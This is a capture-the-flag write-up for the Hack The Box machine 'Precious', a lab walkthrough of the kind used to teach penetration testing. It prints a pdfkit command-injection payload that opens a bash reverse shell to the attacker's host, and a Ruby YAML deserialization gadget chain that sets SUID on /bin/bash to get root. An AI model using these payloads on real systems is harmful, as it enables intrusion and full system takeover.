# HTB - Precious

## Summary

This is a very easy box. Initial access is just exploiting a known vulnerability with the version of pdfkit the target http server is running, and escalating is a yaml deserialization attack using a misconfigured sudo access.

<br />

## Foothold

Nmap shows 22 and 80 open, 80 has a redirect to precious.htb so I added that to `/etc/hosts`  

Navigating to `http://precious.htb` shows that we have a simple tool that converts web pages to pdf documents. We can create one of these documents by hosting a python web server on 8000 and then entering `http://10.10.14.4:8000`  
Running `exiftool downloadedpdf.pdf` we can see that the pdf was generated using `pdfkit v0.8.6`  
Searching google for `pdfkit v0.8.6 exploit` we find that there is an RCE vulnerability with this version of pdfkit.  

`exiftool` is a tool to show us information about pdfs  

Entering the web link:  
```
http://10.10.14.4:8000/#{'%20`sleep 5`'}
```
causes the page to go dormant for about 5 seconds  
Entering:
```
http://10.10.14.4:8000/#{'%20`bash -c "bash -i >& /dev/tcp/10.10.14.4/8686 0>&1"`'}
```  
with a nc listner on 8686 gets us a reverse shell.  
With this reverse shell, we can find a user "henry's" password written in plaintext in a config file  

<br />

## Privilege Escalation

After sshing with henry, run `sudo -l` and we see:  
`(root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb`  

We can read `update_dependencies.rb` and see that it will call  
`YAML.load(File.read("dependencies.yml"))`  

Based on that, I looked up "ruby yaml deserialization exploit" and clicked the first link which led me to writing the following `dependencies.yml` file:  
```yaml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: "chmod u+s /bin/bash"
         method_id: :resolve
```  
After running `sudo /usr/bin/ruby /opt/update_dependencies.rb`  in the directory where my malicious `dependencies.yml` file is located, a buch of errors get thrown, but `ls -la /bin/bash` reveals the suid bit has been set, allowing us to run `/bin/bash -p` and get a shell as root